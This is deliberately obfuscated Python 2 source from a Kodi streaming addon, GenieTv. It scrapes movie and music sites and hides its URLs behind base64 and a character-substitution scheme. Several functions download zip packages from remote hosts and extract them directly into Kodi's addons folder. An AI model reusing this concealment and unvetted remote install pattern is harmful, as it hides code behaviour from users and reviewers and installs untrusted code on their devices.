 IiI11iII1 = re . compile ( '<div id="play-1".+?src="(.+?)" scrolling="no".+?<li><a href="#play-1">(.+?)</a></li>' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ( url + '&fv=&sou=' ) . replace ( 'player' , 'watch' ) , 7000 , ii11iIi1I + 'icon.png' )
  if 81 - 81: Ooo0OO0oOO - i11i1
def IIIIii11II1I ( name , url , img ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 iIiiIIii1 = re . compile ( '<iframe class="playerframe" src="(.+?)" scrolling=".+?" marginwidth=".+?" marginheight=".+?" vspace=".+?" hspace=".+?" allowfullscreen=".+?" webkitallowfullscreen=".+?" mozallowfullscreen=".+?" width=".+?" height=".+?" frameborder=".+?"></iframe>' , re . DOTALL ) . findall ( Oo0oO00o )
 iIii = len ( iIiiIIii1 )
 if 95 - 95: OOoo0OO0 / iI1Ii11iII1 . O0 * iI1Ii11iII1 - OOooOOo * Oo
 if 6 - 6: I1IiI . OoOoOO00 * OOOo0 . OOOo0 / oO0O
 if iIii == 1 :
  for I1I1ii1111 in iIiiIIii1 :
   I1I1ii1111 = I1I1ii1111 . replace ( 'player' , 'watch' )
   IIIiI1iiiIIIi = I1I1ii1111 + '&fv=&sou='
   OoO000Oo00 = I1ii1Ii1 ( IIIiI1iiiIIIi )
   iI1oOoo = re . compile ( '<source src="(.+?)" type=".+?">' , re . DOTALL ) . findall ( OoO000Oo00 )
   for i1oOOO0ooOO in iI1oOoo :
    o00O0o00oo = False
    Resolve ( i1oOOO0ooOO )
    if 19 - 19: OOOo0
 elif iIii > 1 :
  if 66 - 66: Ooo0OO0oOO / I1IiI
  for I1I1ii1111 in iIiiIIii1 :
   iII1I = I1ii1Ii1 ( I1I1ii1111 )
   o00oOOo0Oo = re . compile ( '<iframe width=".*?" height=".*?" frameborder=".*?" src="(.*?)" scrolling=".*?" marginwidth=".*?" marginheight=".*?" vspace=".*?" hspace=".*?" allowfullscreen=".*?" webkitallowfullscreen=".*?" mozallowfullscreen=".*?"></iframe>' , re . DOTALL ) . findall ( iII1I )
   Oooo0o0oO = o00oOOo0Oo
   Oooo0o0oO = ( str ( Oooo0o0oO ) ) . replace ( '[\'' , '' ) . replace ( '\']' , '' ) ;
   print 'Stripped url : ' + Oooo0o0oO
   I1i1iii1Ii ( 'DOUBLE LINK' , Oooo0o0oO , 424 , '' )
   if 82 - 82: oOO
   for url in o00oOOo0Oo :
    oo0o0000Oo0 ( 'DOUBLE LINK' , url , 424 , '' )
    try :
     I1III1111iIi = Google . resolve ( url )
    except :
     pass
    try :
     OoOooO0 = re . findall ( r"{'url': u'(.*?)', 'quality': 'HD'}, {'url': u'(.*?)', 'quality': 'SD'}" , str ( I1III1111iIi ) )
     for iI1IiiiIi , IiI111 in OoOooO0 :
      if 82 - 82: OOOo0 % Ooo00oOo00o % OOoo0OO0 + OOoo0OO0
      HD_URLS . append ( iI1IiiiIi )
      SD_URLS . append ( IiI111 )
    except :
     pass
 else :
  pass
  if 6 - 6: Oo
def O0OOOOoO00oo ( ) :
 if 80 - 80: i1IIi . OOOo0 - Ooo0OO0oOO + i11i1 + II1i1IiiIIi11 % Ooo0OO0oOO
 if 13 - 13: OoOoOO00 / I1IiI / I1IiI + oOO
 oo0o0000Oo0 ( 'Genres' , 'http://cnfstudio.com/movies/' , 7002 , ii11iIi1I + 'Movies.png' )
 if 49 - 49: O0 / OoOoOO00 * OOOo0 - OoooooooOO . OoOoOO00 % iI1Ii11iII1
 oo0o0000Oo0 ( 'Search Movies' , '' , 7017 , ii11iIi1I + 'Movies.png' )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 13 - 13: Ooo0OO0oOO . iIii1I11I1II1 . i11i1 . iI1Ii11iII1
 if 58 - 58: OOoo0OO0
def Ii11I ( ) :
 IIi1IIIi = I1ii1Ii1 ( 'http://cnfstudio.com/' )
 IiI11iII1 = re . compile ( '<a href="http://cnfstudio.com/genre/(.+?)">(.+?)</a>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , 'http://cnfstudio.com/genre/' + ooooO0oOoOOoO , 7003 , ii11iIi1I + 'icon.png' )
  if 72 - 72: O0 + OOooOOo + OOOo0 / Oo
i1iiIIiiI111 = xbmcgui . Dialog ( )
if 83 - 83: iI1Ii11iII1 - OOOo0 . oO0O
iI1Iii11i = '{UN},' ; O0OOOo0o = '{IG},' ; ooo0oOOOO00Oo = '{PL},' ; Ii1iii1 = '{LO},' ; iii11III1I = '{LP},' ; oO0oO0O = '{HA},' ; ooooO = '{XD},' ; O000oooO0 = '{TA},' ; oOO00 = '{DP},' ; oO0o00 = '{JT},' ; Oo0OOOO0oOoo0 = '{JJ},' ; O0OIIII1i = '{MM},' ; i1I1Iiii = '{FQ},' ; I1iIIIiiii = '{HH},'
if 44 - 44: I1I1ii / oO0O * i11i1 * i1IIi . oO0O * i11iIiiIii
def O0o0oo0O ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt=".+?" />.+?<a href="(.+?)"><span class="player"></span></a>.+?<h2>(.+?)</h2>' , re . DOTALL ) . findall ( IIi1IIIi )
 Ooo00OOo000 = re . compile ( "<link rel='next' href='(.+?)'/>" ) . findall ( IIi1IIIi )
 for IIIIiI11I11 , url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '&#038;' , '' ) . replace ( '&#8216;' , '' ) . replace ( '&#8217;' , '' ) . replace ( '&#8211;' , '' ) , url , 7004 , IIIIiI11I11 )
 Ooo00OOo000 = Ooo00OOo000
 for url in Ooo00OOo000 :
  oo0o0000Oo0 ( 'Next Page' , url , 7003 , ii11iIi1I + 'Next.png' )
  if 12 - 12: oO0O . OOOo0 % OOooOOo
def I11i1I11 ( url ) :
 if 32 - 32: iI1Ii11iII1 - Ooo0OO0oOO . iIii1I11I1II1 . I1I1ii + OoOoOO00 % OoooooooOO
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div id="play-1" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</div>' , re . DOTALL ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  iii1 = url + '&fv=&sou='
  iii1 = iii1 . replace ( 'player' , 'watch' )
  Oo000 = oOiiIIIII ( iii1 )
  iiI1 = oOiiIIIII ( url )
  if 40 - 40: O0 + iI1Ii11iII1 . oO0O
  if 29 - 29: i11i1 / I1IiI . iIii1I11I1II1 / OOoo0OO0 % I1IiI % II1i1IiiIIi11
def oOiiIIIII ( url ) :
 if 49 - 49: OoOoOO00 / iI1Ii11iII1 - oO0O
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<video id=".+?<source src="(.+?)" type="video/mp4">' , re . DOTALL ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  I1i111I ( url )
  if 7 - 7: OOOo0 / Ooo00oOo00o + I1I1ii + OOoo0OO0 / OOOo0
  if 82 - 82: ii11ii1ii + OoooooooOO
def IIiIi11i111II ( ) :
 iIiIIIi ( '[COLORgreen]Local M3u[/COLOR]' , oOo0oooo00o , 2001 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Remote M3u[/COLOR]' , Oo0o0000o0o0 , 1009 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 52 - 52: OoooooooOO / iI1Ii11iII1 - i1IIi
def Oo00o ( url ) :
 IiI11iII1 = re . compile ( '^#EXTINF:-?[0-9]*(.*?),(.*?)\n(.*?)$' , re . I + re . M + re . U + re . S ) . findall
 for IIIi1ii , oO00oooOOoOo0 , url in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , url , 222 , ii11iIi1I + 'streams.png' )
  if 13 - 13: iIii1I11I1II1 - OoOoOO00 % O0 . oO0O % Ooo00oOo00o
  if 2 - 2: OoooooooOO - oO0O % Ooo0OO0oOO / OOOo0 / OOooOOo
def i1i ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvdHJlZS9tYXN0ZXIvX3JlcG8vcGx1Z2luLnZpZGVvLkdlbmllVHY=' ) )
 IiI11iII1 = re . compile ( '<span class="css-truncate css-truncate-target"><a href="/GenieTv/Genie_Tv/blob/master/_repo/plugin.video.GenieTv/(.+?)" class="js-navigation-open" id=".+?" title=".+?">.+?</a></span>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO in IiI11iII1 :
  ooooO0oOoOOoO = i1111 ( 'aHR0cDovL3Jhdy5naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvbWFzdGVyL19yZXBvL3BsdWdpbi52aWRlby5HZW5pZVR2Lw==' ) + ooooO0oOoOOoO
 oO00oooOOoOo0 = 'plugin.video.GenieTv'
 if 3 - 3: OoOoOO00 / i11i1
 i1I ( ooooO0oOoOOoO , oO00oooOOoOo0 )
 if 49 - 49: i1IIi - I1IiI . Oo + iIii1I11I1II1 - oOO / Oo
def OO00Oo ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvdHJlZS9tYXN0ZXIvX3JlcG8vcmVwb3NpdG9yeS5HZW5pZVR2' ) )
 IiI11iII1 = re . compile ( '<span class="css-truncate css-truncate-target"><a href="/GenieTv/Genie_Tv/blob/master/_repo/repository.GenieTv/(.+?)" class="js-navigation-open" id=".+?" title=".+?">.+?</a></span>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO in IiI11iII1 :
  ooooO0oOoOOoO = i1111 ( 'aHR0cDovL3Jhdy5naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvbWFzdGVyL19yZXBvL3JlcG9zaXRvcnkuR2VuaWVUdi8=' ) + ooooO0oOoOOoO
 oO00oooOOoOo0 = 'repository.GenieTv'
 if 24 - 24: Ooo0OO0oOO - II1i1IiiIIi11 / oOO
 i1I ( ooooO0oOoOOoO , oO00oooOOoOo0 )
 if 10 - 10: I1IiI * i1IIi
 if 15 - 15: OOoo0OO0 + i1IIi - OoOoOO00 % OOOo0
def iIIi1 ( ) :
 iIiIIIi ( '[COLORgreen]CATAGORIES[/COLOR]' , '' , 10051 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]SEARCH[/COLOR]' , '' , 10052 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 76 - 76: OOOo0 - OOOo0 - OOooOOo % oOO * O0
 if 11 - 11: oO0O + OOoo0OO0 . Ooo00oOo00o . i11iIiiIii * Ooo00oOo00o
o0oO0 = xbmcaddon . Addon ( id = 'plugin.video.GenieTv' )
oOOoo00O0O = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
Oo0oO0ooo = xbmcgui . DialogProgress ( )
I1IIiIi = 'https://addons.tvaddons.ag/'
if 93 - 93: Ooo0OO0oOO - i11i1 + OOooOOo . Ooo0OO0oOO / OOoo0OO0
def o0000oO ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 IiiI1II1II1i = 'https://addons.tvaddons.ag/search/?keyword=' + o0Oo0oO0oOO00
 Oo0oO00o = I1ii1Ii1 ( IiiI1II1II1i )
 IiI11iII1 = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , ooooO0oOoOOoO , 10054 , 'https://addons.tvaddons.ag/' + OoOoo00Ooo00 , i1iiIII111ii , '' )
  if 83 - 83: Ooo00oOo00o
  if 16 - 16: oOO
def iIiiIiIIiI ( ) :
 Oo0oO00o = I1ii1Ii1 ( I1IIiIi )
 IiI11iII1 = re . compile ( '<li><a href="(.+?)"><span class="thumbnail"><img src="(.+?)" class="pic" alt=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  if 'Repositories' in oO00oooOOoOo0 :
   pass
  elif 'Services' in oO00oooOOoOo0 :
   pass
  elif 'International' in oO00oooOOoOo0 :
   pass
  else :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 10053 , 'https://addons.tvaddons.ag/' + IIIIiI11I11 , i1iiIII111ii , '' )
   if 93 - 93: iI1Ii11iII1 % ii11ii1ii
   if 31 - 31: OoOoOO00 + i11i1 - OoooooooOO . OOoo0OO0
def Addon ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 i1IoOo000Oo00o = re . compile ( '<li class="nextPage"><a class=".+?" href="(.+?)"><dfn title="next Page">.+?</dfn></a></li>' ) . findall ( Oo0oO00o )
 for url in i1IoOo000Oo00o :
  iIiIIIi ( '[COLORgreen]NEXT PAGE[/COLOR]' , 'https://addons.tvaddons.ag' + url , 10053 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 IiI11iII1 = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( Oo0oO00o )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  if 'Please' in oO00oooOOoOo0 :
   pass
  else :
   iIiIIIi ( oO00oooOOoOo0 , url , 10054 , 'https://addons.tvaddons.ag/' + IIIIiI11I11 , i1iiIII111ii , '' )
   if 81 - 81: OoooooooOO
   if 88 - 88: O0 * OOooOOo
def IIiII ( url , name ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)"' ) . findall ( Oo0oO00o )
 for url in IiI11iII1 :
  if 'plugin' in url :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + url
   O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
   Oo0oO0ooo = xbmcgui . DialogProgress ( )
   Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
   oOOO = os . path . join ( O00OoOO0oo0 , name + '.zip' )
   try :
    os . remove ( oOOO )
   except :
    pass
   downloader . download ( url , oOOO , Oo0oO0ooo )
   I1i11II = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
   time . sleep ( 2 )
   Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
   print '======================================='
   print I1i11II
   print '======================================='
   extract . all ( oOOO , I1i11II , Oo0oO0ooo )
   O0O0Oooo0o ( )
   if 39 - 39: OOooOOo / iI1Ii11iII1 - II1i1IiiIIi11
def i1I ( url , name ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
 oOOO = os . path . join ( O00OoOO0oo0 , name + '.zip' )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 I1i11II = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print I1i11II
 print '======================================='
 extract . all ( oOOO , I1i11II , Oo0oO0ooo )
 O0O0Oooo0o ( )
 if 96 - 96: OOoo0OO0 * ii11ii1ii * oO0O + ii11ii1ii % OOOo0 + i11iIiiIii
def O0O0Oooo0o ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "Origin + Genie TV" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Origin + Jaybox[/COLOR]" )
 return
 if 37 - 37: OOoo0OO0 % ii11ii1ii / oOO
 if 94 - 94: OOoo0OO0 / Ooo00oOo00o . OOooOOo
def iIiOo ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2NyYXBlZC9jYXRzLnBocA==' ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 1007 , OoOoo00Ooo00 )
def iiI11111II ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for url , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 1006 , OoOoo00Ooo00 )
  if 48 - 48: II1i1IiiIIi11 % i11iIiiIii . OoooooooOO * iI1Ii11iII1 % Ooo00oOo00o . II1i1IiiIIi11
  if 6 - 6: O0 . oOO - Ooo0OO0oOO / i11iIiiIii
def O00O0 ( url , iconimage , name ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for url , iconimage , o0OoOO , i1i1ii , name in IiI11iII1 :
  if 'http' in url :
   if '.php' in url :
    iI11Ii111 ( name , url , 1016 , iconimage , i1i1ii , o0OoOO )
   else :
    if 'youtube' in url :
     iIIIiI ( name , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iconimage , i1i1ii , o0OoOO )
    else :
     iIIIiI ( name , url , 222 , iconimage , i1i1ii , o0OoOO )
     i1IIIiiII1 ( 'movies' , 'INFO' )
  else :
   O00o0OoooOo00 ( url , iconimage , name )
   if 1 - 1: OOOo0 + ii11ii1ii
 else :
  IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
  for url , OoOoo00Ooo00 , name in IiI11iII1 :
   if 'http' in url :
    if '.php' in url :
     oo0o0000Oo0 ( name , url , 1016 , OoOoo00Ooo00 )
    else :
     if 'youtube' in url :
      print '>>>>>>>>>>>>>>>>>>>>>>> youtube old way'
      I1i1iii1Ii ( name , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 )
     else :
      I1i1iii1Ii ( name , url , 222 , OoOoo00Ooo00 )
      i1IIIiiII1 ( 'movies' , 'INFO' )
   else :
    O00o0OoooOo00 ( url , OoOoo00Ooo00 , name )
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 70 - 70: iIii1I11I1II1 + OOoo0OO0 . ii11ii1ii / oOO
def O00o0OoooOo00 ( url , iconimage , name ) :
 iconimage = iconimage
 name = name
 url = url
 OOo0 = ( url ) . replace ( Ooo0O0ooo0o , 'http' ) . replace ( ooooooo00oO0OO , '.com' ) ;
 I1i1ii1ii = ( OOo0 ) . replace ( IiiiIIiii , 'a' ) . replace ( I11iiI1I1 , 'b' ) . replace ( o0i1Ii11II , 'c' ) . replace ( oOOO00oOO , 'd' ) . replace ( ooo0oOOOO00Oo , 'e' ) . replace ( oO0o00 , 'f' ) ;
 i1ii = ( I1i1ii1ii ) . replace ( Ii11IIIi1 , 'g' ) . replace ( oO0oO0O , 'h' ) . replace ( IIIii11 , 'i' ) . replace ( OOOOOoooO , 'j' ) . replace ( i1iiiiI11ii , 'k' ) . replace ( oooooOOo0o , 'l' ) ;
 oOOOOO0 = ( i1ii ) . replace ( IIi1I1 , 'm' ) . replace ( oO00o0oOoo , 'n' ) . replace ( oOOI1 , 'o' ) . replace ( OO , 'p' ) . replace ( I1ii1 , 'q' ) . replace ( II1iII1 , 'r' ) ;
 I11II11IiI11 = ( oOOOOO0 ) . replace ( O00o , 's' ) . replace ( iiIIiIi , 't' ) . replace ( Ii11Iiii1iiii , 'u' ) . replace ( i1IIII1111 , 'v' ) . replace ( Ooo0o0000OO , 'w' ) . replace ( iIiI1II1I1 , 'x' ) ;
 OooiIiI1i1Ii = ( I11II11IiI11 ) . replace ( Oo0o00o , 'y' ) . replace ( III1I1 , 'z' ) . replace ( iI1Iii11i , '.' ) . replace ( O0OOOo0o , '(' ) . replace ( Ii1iii1 , ')' ) . replace ( iii11III1I , '/' ) ;
 iI1IIIIII = ( OooiIiI1i1Ii ) . replace ( O00o0OO0OO0oo , '1' ) . replace ( O000oO , '2' ) . replace ( OO0oO0Oo , '3' ) . replace ( O000oooO0 , '4' ) . replace ( oOO00 , '5' ) . replace ( i1i11I1I1 , '6' ) ;
 OoooOO0 = ( iI1IIIIII ) . replace ( Oo0OOOO0oOoo0 , '7' ) . replace ( O0OIIII1i , '8' ) . replace ( i1I1Iiii , '9' ) . replace ( I1iIIIiiii , '0' ) . replace ( O0oO0o0OOOOOO , ':' ) . replace ( IiI1i11IiIiii , '%' ) ;
 url = ( OoooOO0 ) . replace ( oO000 , '-' ) . replace ( ooooO , '_' ) ;
 I1i1iii1Ii ( name , url , 222 , iconimage ) ;
 if 69 - 69: OoOoOO00 + II1i1IiiIIi11
 if 55 - 55: i11iIiiIii + OOOo0
def Oo0ooo ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3VybHMvdXJsLnBocA==' ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 1007 , OoOoo00Ooo00 )
def Oo00o00 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for url , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 1006 , OoOoo00Ooo00 )
  if 74 - 74: O0 + iIii1I11I1II1 + Ooo0OO0oOO * iI1Ii11iII1
def I1o0 ( name , url , iconimage = None ) :
 print '--- Playing "{0}". {1}' . format ( name , url )
 I1IiiiiI1i1I = xbmcgui . ListItem ( path = url , thumbnailImage = iconimage )
 I1IiiiiI1i1I . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , I1IiiiiI1i1I )
 if 48 - 48: OOoo0OO0 + OoOoOO00 % Ooo0OO0oOO % i11i1 * OoOoOO00
 if 41 - 41: Ooo00oOo00o
def i1iiiiii1 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 1006 , IIIIiI11I11 )
def OoO0oOOOO ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI1ii11I1 = url
 IiI11iII1 = re . compile ( "<a href='(.+?)'>(.+?)</a>" ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  if '.mp3' in oO00oooOOoOo0 :
   print '<<<<<<<<<<<<<<<<<<<' + url + '>>>>>>>>>>>>>>>>>>>>>>>>>>>'
   I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.mp3' , '' ) . replace ( '/' , '' ) , 'http://hypem.com' + url , 222 , ii11iIi1I + 'music.png' )
  else :
   oo0o0000Oo0 ( ( oO00oooOOoOo0 ) . replace ( '/' , '' ) , IiI1ii11I1 + url , 1011 , ii11iIi1I + 'music.png' )
def o0oo00OOOo ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 IiI11iII1 = re . compile ( '<td><a href="(.+?)"><img src="(.+?)"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ( 'http://www.cyn.net/music/' + ooooO0oOoOOoO ) . replace ( ' ' , '%20' ) , 1031 , ( 'http://www.cyn.net/music/' + IIIIiI11I11 ) . replace ( ' ' , '%20' ) )
def oo0oO ( url , img ) :
 IIi1IIIi = O00Ooo ( url )
 I1III1111iIi = url
 img = img
 IiI11iII1 = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.mp3' , '' ) , ( I1III1111iIi + '/' + url ) . replace ( ' ' , '%20' ) , 222 , img )
  if 17 - 17: oOO + oOO . ii11ii1ii
  if 50 - 50: iIii1I11I1II1 * Ooo0OO0oOO
def o0Oo ( ) :
 OoO000Oo0oO = ( i1111 ( 'aHR0cDovL2h5cGVtLmNvbS9kb3dubG9hZC8=' ) )
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 ooooO0oOoOOoO = ( i1111 ( 'aHR0cDovL3Bhbmljc3RyZWFtLm5ldC9zdHJlYW1zLw==' ) )
 I1III1111iIi = ( i1111 ( 'aHR0cDovL21hc2xvdmQubm8taXAub3JnL3B1YmxpYy9tcDMv' ) )
 OooOo0oo0O0o00O = ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 if 16 - 16: Ooo00oOo00o % oO0O + ii11ii1ii + Oo / iIii1I11I1II1
 Oo0oO00o = ii111iiIii ( ooooO0oOoOOoO )
 oOIIiIi = ii111iiIii ( I1III1111iIi )
 I1iiIiIII = ii111iiIii ( OooOo0oo0O0o00O )
 if 89 - 89: OOOo0 % Oo - I1IiI * II1i1IiiIIi11 + I1I1ii + OoooooooOO
 if Oo0oO00o != 'Failed' :
  IiI11iII1 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( Oo0oO00o )
  for oO00oooOOoOo0 in IiI11iII1 :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( oO00oooOOoOo0 + ' source 1' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( ooooO0oOoOOoO + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 29 - 29: I1IiI + I1I1ii / i11i1 + oOO
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if oOIIiIi != 'Failed' :
  IIII11I1I = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( Oo0oO00o )
  for oO00oooOOoOo0 in IIII11I1I :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( oO00oooOOoOo0 + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( I1III1111iIi + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 42 - 42: iIii1I11I1II1 - oOO - OOoo0OO0 - I1I1ii
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if I1iiIiIII != 'Failed' :
  I1i1ii1IiIii = re . compile ( '<td><a href=".+?"><img src=".+?"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( I1iiIiIII )
  for oO00oooOOoOo0 in I1i1ii1IiIii :
   if iiI11iI in oO00oooOOoOo0 . lower ( ) :
    oo0o0000Oo0 ( ( oO00oooOOoOo0 + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( OooOo0oo0O0o00O + oO00oooOOoOo0 ) . replace ( ' ' , '%20' ) , 1031 , '' )
    if 33 - 33: I1IiI - O0
    i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
    if 38 - 38: i11i1 * iI1Ii11iII1 - OoooooooOO * iI1Ii11iII1 + OoooooooOO
